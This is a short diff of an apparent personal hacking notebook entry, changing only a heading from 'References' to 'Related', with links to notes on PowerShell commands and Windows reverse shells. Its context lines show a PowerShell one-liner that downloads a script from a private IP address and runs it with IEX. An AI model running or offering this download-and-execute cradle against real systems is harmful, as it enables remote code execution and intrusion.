@@ -4,7 +4,7 @@ powershell -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.69.6
 IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')
 ```
 
-# References
+# Related
 - [20221003151101](/zet/20221003151101/README.md) powershell commands
 - ~/kb/hacking/windows/windows-reverse-shell.md
 
